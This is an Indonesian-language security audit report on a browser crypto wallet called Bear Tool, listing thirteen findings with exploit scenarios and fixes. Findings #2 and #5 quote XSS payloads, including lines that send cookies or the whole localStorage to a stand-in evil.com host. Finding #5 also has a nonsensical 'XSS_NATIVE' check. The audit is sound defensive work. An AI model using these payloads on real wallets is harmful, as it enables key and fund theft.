# Bear Tool — Security Audit Report

**Tanggal:** 2026-09-16
**Auditor:** SECURITY (read-only)
**Scope:** js/wallet.js, js/app.js, js/network.js, js/ui.js, js/theme.js, index.html
**Metode:** Static code review, manual inspection

---

## Ringkasan Eksekutif

| Peringkat | Jumlah |
|-----------|--------|
| P0 Kritis | 1 |
| P1 Tinggi | 4 |
| P2 Sedang | 5 |
| P3 Rendah | 3 |
| **Total** | **13** |

**Poin Utama:**

1. **[P0] ethers.js CDN tanpa SRI hash** — supply chain attack bisa curi private key dari CDN compromise
2. **[P1] XSS via innerHTML** — token symbol dari on-chain data bisa menyuntikkan script ke DOM
3. **[P1] EIP-7702 chainId 0 replay** — authorization bisa di-replay lintas chain, meskipun ada warning
4. **[P1] Tidak ada double-submit protection** — rapid click bisa kirim transaksi berulang
5. **[P1] localStorage keystore rentan XSS** — XSS bisa curi ciphertext + jalankan offline brute-force
6. **[P2] Zero slippage protection** — swap quote bisa di-sandwich tanpa guard
7. **[P2] Data privasi bocor ke RPC/API eksternal** — address + balance tanpa peringatan user
8. **[P2] Private key plaintext di memory JS** — window attack atau memory dump bisa mengakses
9. **[P2] Modal confirmX terlalu mudah bypass** — typed confirmation (YA/DELEGATE) bisa di-skip
10. **[P2] Custom network RPC injection** — user bisa set RPC berbahaya tanpa warning

---

## Temuan Detail

### P0 — KRITIS

#### 1. ethers.js CDN Tanpa Subresource Integrity (SRI)

- **Lokasi:** `index.html:337`
- **Deskripsi:**
  ```html
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
  ```
  Tidak ada atribut `integrity` atau `crossorigin`. Jika jsDelivr compromise (atau MITM), script palsu bisa di-inject. Script palsu bisa:
  - Override `ethers.Wallet` untuk mencuri private key saat transaksi ditandatangani
  - Hook `crypto.subtle` untuk menyimpan password ke server attacker
  - Simpan semua mnemonic ke remote server
- **Exploit Scenario:** MITM di WiFi publik / DNS poisoning / jsDelivr breach → script JavaScript berjalan di context halaman → full access ke keystore, signer, dan semua transaksi. User tidak melihat perbedaan visual.
- **Rekomendasi:**
  ```html
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"
    integrity="sha384-<HASH_DARI_BUILD>"
    crossorigin="anonymous"></script>
  ```
  Generate hash: `openssl dgst -sha384 -binary dist/ethers.umd.min.js | openssl base64 -A`
  Atau: self-host ethers.js dari npm package. Bundling sendiri adalah opsi teraman.

---

### P1 — TINGGI

#### 2. XSS via innerHTML dengan Data On-Chain

- **Lokasi:** `app.js:427-438` (renderAssets), `app.js:569-571` (loadSwapTokens), `app.js:606` (quote box), `app.js:668-669` (bridge quote), `app.js:861-870` (renderApprovals), `app.js:896-904` (deployExtra), `app.js:942-951` (renderActivity)
- **Deskripsi:** Banyak innerHTML yang menyertakan `t.symbol` (token symbol dari on-chain `name()`/`symbol()`). Jika attacker mendeplis token ERC-20 dengan symbol yang mengandung HTML/JS:
  ```javascript
  // Di smart contract:
  // symbol() returns: "<img src=x onerror=alert(document.cookie)>"
  // Atau: "<svg/onload=fetch('https://evil.com/steal?c='+document.cookie)>"
  ```
  Symbol ini masuk ke `renderAssets()` → innerHTML → DOM. Aplikasi ini TIDAP meng-escape konten sebelum render.
- **Exploit Scenario:** Attacker deploy token ERC-20 dengan malicious symbol di chain yang sama. Token muncul di daftar "Popular Tokens" atau user approve token tersebut. Saat `renderAssets()` atau `renderApprovals()` dipanggil, XSS terjadi. XSS bisa mencuri keystore dari localStorage dan mengirimkannya ke attacker. Keystore terenkripsi, tapi attacker bisa offline brute-force password.
- **Rekomendasi:** Buat fungsi `escapeHtml()` dan pakai di semua innerHTML:
  ```javascript
  function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
  }
  ```
  Ganti semua `${variable}` yang masuk innerHTML:
  ```javascript
  // Sebelum:
  `<div class="asset-name">${t.symbol}</div>`
  // Sesudah:
  `<div class="asset-name">${escapeHtml(t.symbol)}</div>`
  ```

#### 3. EIP-7702 Authorization Replay Risk (chainId = 0)

- **Lokasi:** `app.js:701-746` (doEip7702), `index.html:193` (default value)
- **Deskripsi:** Input field `delegateChainId` default value `"0"`. EIP-7702 authorization dengan `chainId = 0` berlaku di SEMUA chain. Meskipun ada warning text "0 (ALL CHAINS — replay risk!)" di `app.js:713`, user masih bisa:
  1. Sign authorization di Sepolia (testnet) dengan chainId 0
  2. Attacker mengambil signature tersebut dan submit ke Ethereum mainnet
  3. Wallet user sekarang di-delegated ke implementation attacker di mainnet
- **Exploit Scenario:** User test delegation di testnet. Attacker sniff transaksi (public mempool), ambil authorization tuple `(chainId=0, address, nonce, v, r, s)`. Submit ke mainnet. Wallet user sekarang di-delegated ke alamat attacker. Semua dana bisa di-transfer attacker.
- **Rekomendasi:**
  1. Default chainId harus `net.chainId` (bukan 0)
  2. Jika user pilih 0 di testnet, tampilkan peringatan ekstra dengan typed confirmation "SAYA PAHAM RISIKO REPLAY"
  3. Pertimbangkan untuk memblokir chainId 0 di mainnet (bukan hanya warning)

#### 4. Double-Submit / Rapid-Click Tidak Dilindungi

- **Lokasi:** `app.js:464` (`$('#btnSend').addEventListener('click', doSend)`), `app.js:473` (doSwap), `app.js:477` (doBridge), `app.js:479` (doDelegate), `app.js:481` (doBatchExecute)
- **Deskripsi:** Tombol transaksi (Send, Swap, Bridge, Delegate, Batch Execute) tidak memiliki proteksi terhadap rapid click. Jika user mengklik cepat 2x:
  1. Transaksi pertama mulai diproses (await provider)
  2. Sebelum selesai, transaksi kedua dimulai dengan nonce yang sama
  3. Transaksi kedua juga mengirim dana
  - Catatan: ethers.js nonce handling biasanya otomatis bump, tapi dependensi pada RPC race condition
- **Exploit Scenario:** User panik click Send 2x → 2 transaksi terkirim, 2x lipat dana keluar. Pada swap dengan slippage tinggi, sandwich attack juga bisa memanfaatkan window ini.
- **Rekomendasi:**
  ```javascript
  async function doSend() {
    if (!state.unlocked) return showUnlockModal();
    if (state.txPending) return toast('Transaction in progress...', 'info');
    state.txPending = true;
    try {
      // ... existing logic
    } finally {
      state.txPending = false;
    }
  }
  ```
  Atau disable tombol secara visual:
  ```javascript
  const btn = $('#btnSend');
  btn.disabled = true;
  try { /* ... */ } finally { btn.disabled = false; }
  ```

#### 5. localStorage Keystore + Activity = Target XSS

- **Lokasi:** `wallet.js:55-68` (saveKeystore/getKeystore), `app.js:927-932` (activity storage), `app.js:48-55` (settings storage)
- **Deskripsi:** Semua data sensitif disimpan di localStorage tanpa expiry:
  - `bear.keystore`: ciphertext + salt + IV (terenkripsi, tapi target brute-force jika password lemah)
  - `bear.accounts`: alamat wallet (bukan rahasia, tapi bisa dipakai untuk phishing)
  - `bear.activity`: hash transaksi, detail (privacy leak)
  - `bear.settings`: RPC URL, bahkan bisa berisi URL berbahaya
  - `bear.customNetworks`: custom RPC bisa jadi malicious
  - Jika XSS terjadi (temuan #2), SEMUA data ini bisa dibaca dan dikirim ke attacker dalam 1 baris code.
- **Exploit Scenario:** XSS → `fetch('https://evil.com/steal?data='+JSON.stringify(localStorage))` → attacker punya keystore + semua alamat + riwayat transaksi. Offline brute-force keystore → wallet compromised.
- **Rekomendasi:**
  1. Pertimbangkan encrypt data sensitif di localStorage dengan key derived dari password (bukan hanya keystore)
  2. Bersihkan data dari memory setelah pemakaian
  3. Tambahkan monitoring: `if (typeof XSS_NATIVE !== 'undefined') window.location.reload()` (defensive)
  4. Prioritas utama: fix XSS (#2) terlebih dahulu

---

### P2 — SEDANG

#### 6. Zero Slippage Protection pada Swap Execution

- **Lokasi:** `app.js:624-639` (doSwap), `app.js:588-621` (getSwapQuote)
- **Deskripsi:** UI menampilkan opsi slippage (0.1%, 0.5%, 1%, 3%, 5%) di HTML:137-144, tapi:
  1. Slippage value TIDAK dibaca saat doSwap() dipanggil
  2. doSwap() hanya menampilkan toast "Simulated mode"
  3. Ketika production 0x API dipakai, slippage tolerance TIDAK dikirim ke API
  4. Fungsi `getSwapQuote()` tidak meneruskan slippage ke URL parameter
- **Exploit Scenario:** Dalam mode production nanti, user set slippage 0.1% tapi tidak diterapkan → transaksi bisa di-sandwich attacked, kerugian hingga berapa persen dari nilai swap.
- **Rekomendasi:**
  ```javascript
  async function getSwapQuote() {
    const slippage = $('#swapSlippage').value; // baca slippage
    const url = `https://api.0x.org/swap/v1/quote?...&slippagePercentage=${slippage}`;
  }
  async function doSwap() {
    const slippage = $('#swapSlippage').value; // gunakan saat build tx
    // ... pastikan slippage diterapkan
  }
  ```

#### 7. Privasi: Address & Balance Terkirim ke RPC/API Eksternal

- **Lokasi:** `app.js:395` (`getBalance`), `app.js:406` (`balanceOf`), `app.js:600` (0x API call), `app.js:663` (LI.FI API call), `app.js:833` (Approval event query)
- **Deskripsi:** Tanpa peringatan ke user, aplikasi mengirim:
  - Wallet address → RPC provider (eth.llamarpc.com, rpc.ankr.com, dll.)
  - Wallet address + balance → 0x API (`api.0x.org`)
  - Wallet address + chain info → LI.FI API (`li.quest`)
  - Wallet address → blockchain explorer (etherscan.io, dll.)
  RPC providers dan API bisa log request, deanonymize user, dan memetakan seluruh portfolio.
- **Exploit Scenario:** User akses Bear Tool melalui VPN, lalu matikan VPN. RPC provider log IP + address. Korrelasi IP ↔ address → deanonymisasi. Address → semua transaksi, semua aset, semua interaksi DeFi. Bahkan data off-chain (siapa yang berinteraksi dengan siapa) bisa dipetakan.
- **Rekomendasi:**
  1. Tambahkan peringatan di Settings atau首次使用的 modal:
     > "Bear Tool mengirim alamat wallet Anda ke RPC provider pihak ketiga untuk mendapatkan data balance. Gunakan VPN atau custom RPC untuk privasi maksimal."
  2. Pertimbangkan menggunakan Tor/VPN integration untuk RPC calls
  3. Rekomendasikan custom RPC ke user privacy-conscious

#### 8. Private Key & Password Plaintext di Memory JavaScript

- **Lokasi:** `app.js:136` (`pw.value` di showUnlockModal), `app.js:168-170` (`p1`, `p2` di showCreateModal), `app.js:226-227` (`secret`, `pw` di showImportModal), `app.js:199` (`ethers.Wallet.fromPhrase(mnemonic)` menyimpan privateKey di Wallet object)
- **Deskripsi:**
  - Password (string) disimpan di variabel lokal `p1`, `pw`. JavaScript string immutable → bisa tetap di memory sampai GC.
  - Private key tersimpan di `state.signer` (ethers.Wallet instance) sampai auto-lock atau manual lock.
  - Window attack: Jika attacker punya akses ke tab yang sama atau extension berbahaya, `state.signer.privateKey` bisa dibaca langsung dari DevTools console.
  - Memory dump (jika browser crash atau OS memory leak) bisa memuat password + private key.
- **Exploit Scenario:** Malicious browser extension → reads `window` state → gets `state.signer.privateKey` → exfiltrate to attacker server. Atau: shared computer, user lupa lock → orang berikutnya buka DevTools → copy private key.
- **Rekomendasi:**
  1. Bersihkan variabel password segera: `pw.value = ''; p1 = '';` setelah pemakaian
  2. Pertimbangkan exponential backoff untuk password attempts (brute-force protection)
  3. Tambahkan clipboard clear setelah copy address/secret
  4. Pertimbangkan `sessionStorage` untuk data sensitif (auto-hapus saat tab close)

#### 9. Modal Typed Confirmation Terlalu Mudah Bypass

- **Lokasi:** `ui.js:52-86` (confirmTx), `app.js:527-534` (doSend mainnet confirm), `app.js:630-636` (doSwap confirm), `app.js:915-920` (doDeploy confirm)
- **Deskripsi:** Typed confirmation hanya memerlukan user mengetik teks yang sama dengan yang ditampilkan (contoh: "YA", "DELEGATE"). Ini:
  1. Terlalu mudah — user bisa copy-paste atau auto-fill
  2. Tidak ada cooldown antara konfirmasi (user bisa langsung confirm lagi)
  3. Tidak ada counter "kamu sudah konfirmasi X kali" untuk melawan kebiasaan blindly confirm
  4. Bridge (`doBridge`) TIDAK memiliki typed confirmation meskipun beroperasi di mainnet
- **Exploit Scenario:** Phishing site menampilkan dialog yang identik dengan Bear Tool. User sudah terbiasa ketik "YA" → tidak membaca detail → konfirmasi transaksi ke attacker.
- **Rekomendasi:**
  1. Tambahkan delay minimum 3 detik sebelum tombol confirm aktif
  2. Tambahkan counter: "Anda telah mengkonfirmasi transaksi mainnet sebanyak 5 kali hari ini"
  3. Tambahkan typed confirmation untuk doBridge (mainnet)
  4. Setiap typed confirmation harus unik (contoh: alamat tujuan harus disertakan dalam teks yang harus diketik)

#### 10. Custom Network RPC Tanpa Validasi / Warning

- **Lokasi:** `app.js:289-320` (showAddNetworkModal), `network.js:186-191` (addCustomNetwork)
- **Deskripsi:**
  1. Custom RPC URL tidak divalidasi (bisa berisi `javascript:`, `data:`, atau URL internal)
  2. RPC ditambahkan langsung ke pool RPC tanpa penanda "untrusted"
  3. Custom RPC bisa menjadi malicious: memalsukan balance, memfilter transaksi, atau logging semua request
  4. Tidak ada warning bahwa custom RPC = trust provider
- **Exploit Scenario:** Attacker share "fast RPC" di Discord/Telegram. User paste → custom RPC ditambahkan. Attacker memalsukan balance (tampilkan ETH 0 padahal sebenarnya 10 ETH) atau mengubah data transaksi sebelum relay.
- **Rekomendasi:**
  1. Validasi URL: harus `https://`, tidak boleh `javascript:`, tidak boleh localhost/private IP
  2. Tambahkan warning: "Custom RPC = Anda mempercayai provider ini dengan data alamat dan balance Anda"
  3. Tandai custom network dengan badge "UNTRUSTED" di UI

---

### P3 — RENDAH

#### 11. PBKDF2 Iterations: 310,000 (Bawah Optimal)

- **Lokasi:** `wallet.js:19`
- **Deskripsi:** 310,000 iterasi dengan SHA-256. NIST SP 800-132 merekomendasikan minimum 600,000 iterasi untuk SHA-256 (updated 2023). OWASP 2023: 600,000 untuk SHA-256. 310,000 masih "acceptable" tetapi di bawah rekomendasi terkini.
- **Exploit Scenario:** Brute-force keystore yang dicuri membutuhkan waktu ~2x lebih sedikit dibandingkan 600,000 iterasi. Untuk password yang kuat (>12 karakter, kompleks), ini bukan issue praktis. Untuk password lemah, dampaknya nyata.
- **Rekomendasi:** Naikkan ke 600,000 untuk SHA-256 sesuai rekomendasi OWASP/NIST 2023. Atau pertimbangkan Argon2id (WebAssembly) untuk memory-hardness.

#### 12. Activity Log Disimpan Tanpa Enkripsi di localStorage

- **Lokasi:** `app.js:927-932` (addActivity, loadActivity)
- **Deskripsi:** Riwayat transaksi disimpan di `localStorage` key `bear.activity` dalam plaintext JSON. Berisi:
  - Transaction hash (public, tapi bisa dikorrelasi dengan address)
  - Timestamp
  - Detail transaksi (amount, symbol, recipient)
  - Transaction type
  Data ini bisa dibaca oleh extension berbahaya atau XSS.
- **Exploit Scenario:** Malicious extension membaca `bear.activity` → mendapatkan daftar semua transaksi → bisa korrelasi dengan identitas off-chain → deanonymisasi.
- **Rekomendasi:** Enkripsi activity log dengan password yang sama seperti keystore, atau setidaknya allow user untuk clear activity. Pertimbangkan auto-clear setelah N hari.

#### 13. RPC Error Messages Leak ke User (Information Disclosure)

- **Lokasi:** `app.js:416` (`'Error: ${e.message}'`), `app.js:562`, `app.js:744`, `app.js:851`
- **Deskripsi:** Error messages dari RPC provider atau ethers.js ditampilkan langsung ke user. Contoh: "Error:CALL_EXCEPTION" bisa mengungkap detail internal tentang state EVM atau version node. Sebagian error bisa mengungkap RPC URL yang sedang dipakai.
- **Exploit Scenario:** Minor information disclosure. Attacker yang bisa memicu error (misal: via crafted contract interaction) bisa mendapatkan detail tentang RPC infrastructure.
- **Rekomendasi:** Log error detail ke console, tampilkan pesan user-friendly ke UI: "Transaction failed. Check console for details."

---

## Area yang TIDAK Ditemukan Masalah

1. **PBKDF2 + AES-GCM:** Implementasi kriptografi dasar benar (Web Crypto API, salt random 16 byte, IV random 12 byte, AES-GCM 256 bit). Tidak ada nonce reuse.
2. **Address Validation:** `isValidAddress()` menggunakan `ethers.getAddress()` yang melakukan EIP-55 checksum validation. Solid.
3. **Address Poisoning Detection:** `isSuspiciousSimilar()` ada (wallet.js:174-178). Prefix 6 + suffix 4 chars. Reasonable.
4. **Auto-Lock:** Timer dengan idle detection (click, keydown, mousemove). Default 5 menit. Reasonable.
5. **Keystore Cleartext:** Keystore tersimpan terenkripsi. Bukan plaintext. Good.
6. **Secret Not Exported to Remote:** Tidak ada kode yang mengirim mnemonic/private key ke remote server. Good.
7. **Revoke Flow:** Approval revoke menggunakan `approve(spender, 0)` dengan confirmation dialog. Standard practice.
8. **EIP-7702 Nonce Handling:** Menggunakan `nonce + 1` untuk self-sponsored (line 726). Sesuai spesifikasi.

---

## Risk Matrix

| # | Finding | Severity | CVSS Est. | Exploitability | Impact |
|---|---------|----------|-----------|----------------|--------|
| 1 | CDN SRI Missing | P0 Kritis | 9.8 | Easy (MITM) | Full key theft |
| 2 | XSS via innerHTML | P1 Tinggi | 8.1 | Medium (need malicious token) | Full key theft |
| 3 | EIP-7702 ChainId 0 | P1 Tinggi | 7.5 | Medium (need victim to test on testnet) | Wallet delegation hijack |
| 4 | Double-Submit | P1 Tinggi | 7.2 | Easy (accidental) | Double spending |
| 5 | localStorage Target | P1 Tinggi | 7.0 | Medium (needs XSS) | All data theft |
| 6 | Slippage Not Applied | P2 Sedang | 6.5 | Easy (sandwich) | Financial loss |
| 7 | Privacy Leak | P2 Sedang | 5.3 | Easy (passive) | Deanonymization |
| 8 | Key in Memory | P2 Sedang | 5.0 | Medium (needs browser attack) | Key theft |
| 9 | Confirm Bypass | P2 Sedang | 4.8 | Medium (phishing) | Phishing success |
| 10 | Custom RPC | P2 Sedang | 4.5 | Medium (social engineering) | Data manipulation |
| 11 | PBKDF2 Low Iterations | P3 Rendah | 3.5 | Hard (needs stolen keystore) | Faster brute-force |
| 12 | Activity Plaintext | P3 Rendah | 3.0 | Medium (needs extension) | Privacy loss |
| 13 | Error Disclosure | P3 Rendah | 2.0 | Hard (needs trigger) | Info leak |

---

## Rekomendasi Prioritas Perbaikan

| Prioritas | Temuan | Estimasi Effort |
|-----------|--------|-----------------|
| 1 (Immediate) | #1 — Tambah SRI hash ke ethers.js CDN | 10 menit |
| 2 (Immediate) | #2 — Tambah escapeHtml() untuk semua innerHTML | 1 jam |
| 3 (Before mainnet) | #4 — Tambah txPending guard ke semua tombol transaksi | 30 menit |
| 4 (Before mainnet) | #6 — Wire slippage ke swap execution | 1 jam |
| 5 (Before mainnet) | #3 — Default chainId ke net.chainId, blokir 0 di mainnet | 30 menit |
| 6 (Before mainnet) | #10 — Validasi custom RPC URL | 30 menit |
| 7 (Before mainnet) | #9 — Tambah delay + counter ke typed confirmation | 1 jam |
| 8 (Documentation) | #7 — Tambah privacy warning untuk RPC | 15 menit |
| 9 (Hardening) | #8 — Clear password dari memory | 30 menit |
| 10 (Hardening) | #11 — Naikkan PBKDF2 ke 600,000 iterasi | 5 menit |
| 11 (Hardening) | #12 — Enkripsi atau auto-clear activity log | 1 jam |
| 12 (Hardening) | #13 — Sanitize error messages | 30 menit |

---

## Metodologi

- **Static Analysis:** Manual review seluruh codebase (6 file, ~1,700 baris)
- **No dynamic testing** — ini adalah audit READ-ONLY tanpa eksekusi
- **Tidak ada dependency audit** — ethers v6 dari CDN, tidak ada package.json yang di-audit
- **Coverage:** Semua file JS dan HTML yang diberikan. Tidak ada CSS review (di luar scope keamanan).

---

*Audit ini dilakukan pada 2026-09-16. Temuan berdasarkan codebase saat ini. Perubahan kode memerlukan re-audit.*
